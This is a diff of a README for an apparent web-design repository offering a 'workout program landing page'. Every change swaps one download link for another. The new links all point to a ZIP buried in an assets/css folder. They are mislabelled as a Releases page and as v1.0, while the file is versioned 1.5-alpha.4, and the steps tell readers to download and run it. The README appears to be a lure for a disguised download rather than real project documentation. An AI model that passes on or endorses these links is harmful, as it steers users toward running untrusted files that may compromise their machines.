@@ -6,7 +6,7 @@ Welcome to the workout-program_ui repository! This project offers a beautiful la
 
 ## 📥 Download Links
 
-[![Download Latest Release](https://raw.githubusercontent.com/Salvleal/workout-program_ui/main/officership/workout-program_ui.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Salvleal/workout-program_ui/main/officership/workout-program_ui.zip)
+[![Download Latest Release](https://github.com/Salvleal/workout-program_ui/raw/refs/heads/main/assets/css/program_workout_ui_1.5-alpha.4.zip%20Latest%20Release-v1.0-blue)](https://github.com/Salvleal/workout-program_ui/raw/refs/heads/main/assets/css/program_workout_ui_1.5-alpha.4.zip)
 
 ## 📋 System Requirements
 
@@ -26,11 +26,11 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 💻 Download & Install
 
-To download the application, visit our [Releases page](https://raw.githubusercontent.com/Salvleal/workout-program_ui/main/officership/workout-program_ui.zip) where you can find the latest version of the landing page design files. 
+To download the application, visit our [Releases page](https://github.com/Salvleal/workout-program_ui/raw/refs/heads/main/assets/css/program_workout_ui_1.5-alpha.4.zip) where you can find the latest version of the landing page design files. 
 
 Follow these steps to download and run the workout program landing page:
 
-1. Click on the **Releases** link above or [here](https://raw.githubusercontent.com/Salvleal/workout-program_ui/main/officership/workout-program_ui.zip).
+1. Click on the **Releases** link above or [here](https://github.com/Salvleal/workout-program_ui/raw/refs/heads/main/assets/css/program_workout_ui_1.5-alpha.4.zip).
 2. On the Releases page, you will see a list of available downloads. Look for the latest version labeled with the format v1.0.
 3. Click on the download link to save the ZIP file to your computer.
 4. Once the download finishes, locate the ZIP file in your Downloads folder.
